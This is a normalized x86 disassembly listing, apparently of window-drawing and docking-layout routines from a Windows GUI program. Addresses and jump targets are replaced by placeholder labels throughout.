mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_424514
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_424c34
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_424bd4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_424bd4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_424514
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_424bd4
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_424bd4
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_453980
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_4538a0
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_4538f8
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_4538f8
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_4538a0
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_4538f8
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_4538f8
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_453a5c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424944
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453bb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4489fc
mov eax [ ebp - 0x4 ]
call sub_424c0c
xor eax eax
push ebp
push sub_453b95
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_425038
xor eax eax
push ebp
push sub_453b78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_44d44c
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453b7f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_425038
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_44d410
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4497c0
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_453bc0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_44f24c
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_449868
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_449824
mov ecx eax
xor edx edx
xor eax eax
call sub_416f24
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_45071c
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416f4c
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_453d34
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_453d34
pop ecx
mov eax ebx
call sub_403154
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_453d34
pop ecx
sub_453d68
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_453d34
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403154
xor eax eax
mov [ esi + 0x64 ] eax
sub_453dc4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452dd4
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_453e00
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_453e00
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45406d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c80
mov edx [ ebp - 0x8 ]
pop eax
call sub_404218
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax [ ebx + 0x14 ]
call sub_452560
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c80
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c80
mov edx [ ebp - 0x10 ]
pop eax
call sub_404218
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403154
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454074
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f74
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_452910
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_452a88
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_452ac4
mov eax [ ebx + 0x18 ]
call sub_452910
mov [ edx + 0x18 ] eax
push esi
push sub_454610
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_452e3c
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_452ac4
mov eax [ esi + 0x64 ]
call sub_452a88
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403154
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_4545e8
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403154
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_45260c
mov edx eax
mov eax edi
call sub_452ab0
mov eax edi
call sub_452910
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_454610
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_452e3c
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_454610
mov edx [ eax + 0x14 ]
mov eax esi
call sub_452e3c
mov eax [ ebx + 0x14 ]
call sub_403154
mov eax edi
call sub_403154
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_45407c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_44f24c
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407dd8
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_452ab0
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44f1b8
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_452ab0
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_454498
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_454610
xor edx edx
mov eax edi
call sub_452e3c
sub_454158
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_452a88
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_40293c
mov edx eax
mov eax ebx
call sub_452ab0
sub_454194
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_4541ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404210
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454206
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_45420c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4542bb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_452818
mov eax [ ebp - 0x8 ]
call sub_454194
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_45420c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4542c2
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_45420c
pop ecx
sub_4542c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_454401
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4543b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44f1b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4543b7
mov eax [ ebp - 0x10 ]
call sub_403154
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_454194
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44f1cc
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_4543b7
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_45420c
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454408
lea eax [ ebp - 0x14 ]
call sub_403f50
retn
sub_454410
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_452b60
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452b88
call sub_454410
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452b60
call sub_454410
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_452590
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_452a88
mov edx eax
mov eax ebx
call sub_452ab0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_452ab0
jmp r-xdata
sub_454498
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_454410
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_4544dc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_452a88
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_452ab0
sub_45450c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_45071c
mov edx eax
mov eax [ rw-data ]
call sub_45506c
mov eax [ ebx + 0x14 ]
call sub_45071c
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_454620
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_45456c
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_45506c
mov eax ebx
call sub_454620
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_452ab0
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_452ab0
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_454498
push ebx
push sub_454610
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_452e3c
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_4545e8
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_44f1b8
test eax eax
jle r-xdata
push ebx
push sub_454610
xor edx edx
mov eax ebx
call sub_452e3c
sub_454620
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_452654
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_452654
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_4526c0
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_4526c0
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_424828
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_45470c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_45470c
pop ecx
mov eax ebx
call sub_452a88
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_452a88
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_45470c
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_452a88
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4299a4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_45479c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_452a88
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_45260c
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_452a88
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_45470c
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4547ec
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_4497c0
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4497c0
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
